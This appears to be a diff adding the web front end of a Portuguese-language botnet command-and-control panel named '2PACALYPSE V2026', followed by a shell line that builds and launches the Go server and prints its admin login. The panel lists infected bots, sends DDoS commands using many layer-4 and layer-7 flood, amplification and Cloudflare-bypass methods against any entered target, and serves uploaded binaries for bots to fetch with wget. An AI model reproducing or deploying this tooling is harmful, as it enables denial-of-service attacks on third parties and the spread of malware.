+<div class="card"><div class="lbl"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M17 21v-2a4 4 0 00-4-4H5a4 4 0 00-4-4v2"/><circle cx="9" cy="7" r="4"/><path d="M23 21v-2a4 4 0 00-3-3.87"/><path d="M16 3.13a4 4 0 010 7.75"/></svg>Bots Online</div><div class="val g" id="bot-count">0</div></div>
+<div class="card"><div class="lbl"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M18 20V10M12 20V4M6 20v-6"/></svg>CPU</div><div class="val" id="cpu-val">--</div></div>
+<div class="card"><div class="lbl"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="4" y="4" width="16" height="16" rx="2"/><path d="M9 9h6v6H9z"/><path d="M9 1v3M15 1v3M9 20v3M15 20v3M1 9h3M1 15h3M20 9h3M20 15h3"/></svg>RAM</div><div class="val" id="ram-val">--</div></div>
+<div class="card"><div class="lbl"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="2" y="3" width="20" height="14" rx="2"/><line x1="8" y1="21" x2="16" y2="21"/><line x1="12" y1="17" x2="12" y2="21"/></svg>Web Porta</div><div class="val">1337</div></div>
+<div class="card"><div class="lbl"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M22 12h-4l-3 9L9 3l-3 9H2"/></svg>Bot Porta</div><div class="val">8443</div></div>
+</div>
+<div class="status-bar"><div class="pulse-dot"></div><p>Sistema <strong>ONLINE</strong> | Potencia automatica por CPU</p></div>
+
+<div id="tab-attack" class="tab-content active">
+<div class="panel">
+<div class="panel-title"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M13 2L3 14h9l-1 8 10-12h-9l1-8z"/></svg>Enviar Comando</div>
+<div class="atk-form">
+<input type="text" id="cmd-input" class="atk-input" placeholder="Ex: UDP 1.2.3.4:80 60">
+<button class="btn-p" onclick="sendAttack()">ENVIAR</button>
+<button class="btn-d" onclick="stopAttack()">PARAR TUDO</button>
+</div>
+<div class="help">
+<span style="color:#c084fc">&#9889; Potencia automatica - cada bot usa 100%% dos CPUs disponiveis</span><br><br>
+L4: &lt;method&gt; &lt;ip:port&gt; &lt;duration&gt; [reflectors_file]<br>
+L7: &lt;method&gt; &lt;url&gt; &lt;socks_type&gt; &lt;proxylist&gt; &lt;rpc&gt; &lt;duration&gt;<br><br>
+<span style="color:#60a5fa">Exemplos L4:</span><br>
+UDP 1.2.3.4:80 60<br>
+TCP 1.2.3.4:443 120<br>
+SYN 1.2.3.4:80 60<br>
+DNS 1.2.3.4:53 60 reflectors.txt<br><br>
+<span style="color:#60a5fa">Exemplos L7:</span><br>
+GET https://target.com 5 proxy.txt 64 120<br>
+POST https://target.com 1 proxy.txt 32 60<br>
+BYPASS https://target.com 0 none 100 120<br><br>
+<span style="color:#fbbf24">L4:</span> TCP, UDP, SYN, ICMP, VSE, TS3, MCPE, FIVEM, OVH-UDP, MINECRAFT, CPS, CONNECTION, MCBOT, MEM, NTP, DNS, ARD, CLDAP, CHAR, RDP<br>
+<span style="color:#fbbf24">L7:</span> CFB, BYPASS, GET, POST, OVH, STRESS, DYN, SLOW, HEAD, NULL, COOKIE, PPS, EVEN, GSB, DGB, AVB, CFBUAM, APACHE, XMLRPC, BOT, BOMB, DOWNLOADER, KILLER, TOR, RHEX, STOMP
+</div>
+<div id="response-msg" class="msg"></div>
+</div>
+</div>
+
+<div id="tab-bots" class="tab-content">
+<div class="panel">
+<div class="panel-title"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="11" width="18" height="10" rx="2"/><circle cx="12" cy="5" r="3"/><path d="M8 16h.01M16 16h.01"/></svg>Bots Conectados <span style="color:var(--dim);font-size:11px;font-weight:400;margin-left:8px">tempo real</span></div>
+<div id="bots-container"><div class="empty"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg><div>Nenhum bot conectado</div></div></div>
+</div>
+</div>
+
+<div id="tab-files" class="tab-content">
+<div class="panel">
+<div class="panel-title"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 15v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-4"/><polyline points="17 8 12 3 7 8"/><line x1="12" y1="3" x2="12" y2="15"/></svg>Upload de Binarios</div>
+<div class="upload-zone" id="drop-zone" onclick="document.getElementById('file-input').click()">
+<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><path d="M14 2H6a2 2 0 00-2 2v16a2 2 0 002 2h12a2 2 0 002-2V8z"/><polyline points="14 2 14 8 20 8"/><line x1="12" y1="18" x2="12" y2="12"/><polyline points="9 15 12 12 15 15"/></svg>
+<p>Clique para selecionar ou arraste arquivos aqui</p>
+<div class="small">Arquivos ficarao disponiveis via wget/curl</div>
+</div>
+<input type="file" id="file-input" style="display:none" onchange="uploadFile(this.files[0])">
+<div id="upload-msg" class="msg"></div>
+<div id="files-list"></div>
+</div>
+</div>
+</div>
+<script>
+var svgFile='<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="width:20px;height:20px"><path d="M14 2H6a2 2 0 00-2 2v16a2 2 0 002 2h12a2 2 0 002-2V8z"/><polyline points="14 2 14 8 20 8"/></svg>';
+var svgEmpty='<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="width:40px;height:40px"><path d="M22 19a2 2 0 01-2 2H4a2 2 0 01-2-2V5a2 2 0 012-2h5l2 3h9a2 2 0 012 2z"/></svg>';
+var svgEye='<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="width:40px;height:40px"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>';
+function switchTab(t){
+document.querySelectorAll('.tab-content').forEach(e=>e.classList.remove('active'));
+document.querySelectorAll('.nav-tab').forEach(e=>e.classList.remove('active'));
+document.getElementById('tab-'+t).classList.add('active');
+var tabs=document.querySelectorAll('.nav-tab');
+var idx=t==='attack'?0:t==='bots'?1:2;
+if(tabs[idx])tabs[idx].classList.add('active');
+}
+function fmtTime(s){
+s=Math.floor(s);let d=Math.floor(s/86400);s%%=86400;let h=Math.floor(s/3600);s%%=3600;let m=Math.floor(s/60);s%%=60;
+if(d>0)return d+'d '+h+'h '+m+'m '+s+'s';
+if(h>0)return h+'h '+m+'m '+s+'s';
+if(m>0)return m+'m '+s+'s';
+return s+'s';
+}
+function fmtSize(b){if(b<1024)return b+' B';if(b<1048576)return(b/1024).toFixed(1)+' KB';return(b/1048576).toFixed(1)+' MB'}
+function archBadge(a){
+let l=a.toLowerCase();
+if(l.includes('x86_64')||l.includes('amd64'))return'b-blue';
+if(l.includes('x86')||l.includes('i686')||l.includes('i386'))return'b-blue';
+if(l.includes('mips'))return'b-yellow';
+if(l.includes('aarch64')||l.includes('arm64'))return'b-purple';
+if(l.includes('arm'))return'b-green';
+return'b-gray';
+}
+let serverStartTime=null;
+function fmtMem(b){if(b<1024)return b+' B';if(b<1048576)return(b/1024).toFixed(1)+' KB';if(b<1073741824)return(b/1048576).toFixed(1)+' MB';return(b/1073741824).toFixed(2)+' GB'}
+function refreshStats(){
+fetch('/api/stats').then(r=>r.json()).then(d=>{
+serverStartTime=d.uptime;
+document.getElementById('bot-count').textContent=d.bots;
+document.getElementById('cpu-val').textContent=d.cpu.toFixed(1)+'%%';
+document.getElementById('ram-val').textContent=fmtMem(d.rss);
+}).catch(()=>{});
+}
+let localTick=0;
+function tickUptime(){
+if(serverStartTime!==null){
+let cur=serverStartTime+localTick;
+document.getElementById('uptime').textContent=fmtTime(cur);
+localTick++;
+}
+}
+refreshStats();
+setInterval(()=>{localTick=0;refreshStats()},10000);
+setInterval(tickUptime,1000);
+tickUptime();
+function refreshBots(){
+fetch('/api/bots').then(r=>r.json()).then(data=>{
+document.getElementById('bot-count').textContent=data.count;
+let c=document.getElementById('bots-container');
+if(data.count===0){c.innerHTML='<div class="empty">'+svgEye+'<div>Nenhum bot conectado</div></div>';return}
+let h='<table><thead><tr><th>#</th><th>IP</th><th>Arch</th><th>OS</th><th>Local IP</th><th>Uptime</th><th>Status</th><th>Ping</th></tr></thead><tbody>';
+data.bots.forEach(b=>{
+let bc=archBadge(b.arch);
+let sc=b.status==='attacking'?'sd-r':'sd-g';
+let st=b.status==='attacking'?'Atacando':'Idle';
+h+='<tr><td>'+b.id+'</td><td><strong>'+b.ip+'</strong></td><td><span class="badge '+bc+'">'+b.arch+'</span></td><td>'+b.os+'</td><td>'+b.local_ip+'</td><td>'+fmtTime(b.uptime)+'</td><td><span class="sd '+sc+'"></span>'+st+'</td><td>'+fmtTime(b.last_ping)+'</td></tr>';
+});
+h+='</tbody></table>';
+c.innerHTML=h;
+}).catch(()=>{});
+}
+refreshBots();
+setInterval(refreshBots,5000);
+function sendAttack(){
+let cmd=document.getElementById('cmd-input').value.trim();
+if(!cmd)return;
+fetch('/api/attack',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'command='+encodeURIComponent(cmd)})
+.then(r=>r.json()).then(d=>{
+let el=document.getElementById('response-msg');
+el.className='msg ok';el.textContent='Enviado para '+d.sent+'/'+d.total+' bots: '+d.command;
+setTimeout(()=>{el.className='msg'},5000);
+}).catch(()=>{
+let el=document.getElementById('response-msg');
+el.className='msg err';el.textContent='Erro ao enviar';
+setTimeout(()=>{el.className='msg'},5000);
+});
+}
+function stopAttack(){
+fetch('/api/stop',{method:'POST'}).then(r=>r.json()).then(d=>{
+let el=document.getElementById('response-msg');
+el.className='msg ok';el.textContent='STOP enviado para '+d.sent+'/'+d.total+' bots';
+setTimeout(()=>{el.className='msg'},5000);
+});
+}
+document.getElementById('cmd-input').addEventListener('keydown',e=>{if(e.key==='Enter')sendAttack()});
+let dz=document.getElementById('drop-zone');
+dz.addEventListener('dragover',e=>{e.preventDefault();dz.classList.add('dragover')});
+dz.addEventListener('dragleave',()=>dz.classList.remove('dragover'));
+dz.addEventListener('drop',e=>{e.preventDefault();dz.classList.remove('dragover');if(e.dataTransfer.files.length)uploadFile(e.dataTransfer.files[0])});
+function uploadFile(file){
+if(!file)return;
+let fd=new FormData();fd.append('file',file);
+let el=document.getElementById('upload-msg');
+el.className='msg ok';el.textContent='Uploading '+file.name+'...';
+fetch('/api/upload',{method:'POST',body:fd}).then(r=>r.json()).then(d=>{
+if(d.status==='ok'){el.className='msg ok';el.textContent='Upload concluido: '+d.name+' ('+fmtSize(d.size)+')';}
+else{el.className='msg err';el.textContent=d.message||'Erro';}
+setTimeout(()=>{el.className='msg'},4000);
+refreshFiles();
+}).catch(()=>{el.className='msg err';el.textContent='Erro no upload';setTimeout(()=>{el.className='msg'},4000)});
+document.getElementById('file-input').value='';
+}
+function refreshFiles(){
+fetch('/api/files').then(r=>r.json()).then(d=>{
+let c=document.getElementById('files-list');
+if(!d.files||d.files.length===0){c.innerHTML='<div class="empty" style="padding:20px">'+svgEmpty+'<div>Nenhum arquivo</div></div>';return}
+let h='';
+d.files.forEach(f=>{
+h+='<div class="file-item"><div class="file-info">'+svgFile+'<div><div class="file-name">'+f.name+'</div><div class="file-size">'+fmtSize(f.size)+' - '+fmtTime(f.ago)+' atras</div></div></div>';
+h+='<div class="file-url"><span class="url-box" id="url-'+f.id+'" title="'+f.url+'">wget '+f.url+' -O '+f.name+'</span>';
+h+='<button class="btn-sm btn-copy" onclick="copyUrl(this,\'url-'+f.id+'\')">Copiar</button>';
+h+='<button class="btn-sm btn-del" onclick="delFile(\''+f.id+'\')">X</button></div></div>';
+});
+c.innerHTML=h;
+}).catch(()=>{});
+}
+function copyUrl(btn,spanId){
+var text=document.getElementById(spanId).textContent;
+var ta=document.createElement('textarea');
+ta.value=text;
+ta.style.position='fixed';
+ta.style.left='-9999px';
+ta.style.top='-9999px';
+document.body.appendChild(ta);
+ta.focus();
+ta.select();
+try{document.execCommand('copy');btn.textContent='Copiado!';setTimeout(function(){btn.textContent='Copiar'},1500)}catch(e){}
+document.body.removeChild(ta);
+}
+function delFile(id){
+fetch('/api/delete-file',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'id='+id}).then(()=>refreshFiles());
+}
+refreshFiles();
+setInterval(refreshFiles,15000);
+</script>
+</body>
+</html>`
+}
+ENDOFFILE
+go build -ldflags="-s -w" -o meu_servidor server.go && nohup ./meu_servidor > log.txt 2>&1 & sleep 1 && echo "" && echo "================================================" && echo "   [OK] 2PACALYPSE V2026 - Sistema Iniciado" && echo "================================================" && echo "   Web Porta: 1337" && echo "   Bot Porta: 8443" && echo "   Usuario: soosudsabe" && echo "   Senha: 2pacalypse" && echo "   URL: http://$(curl -s ifconfig.me 2>/dev/null || echo 'SEU_IP'):1337" && echo "================================================" && ps -o pid,%cpu,%mem,rss,cmd -C meu_servidor
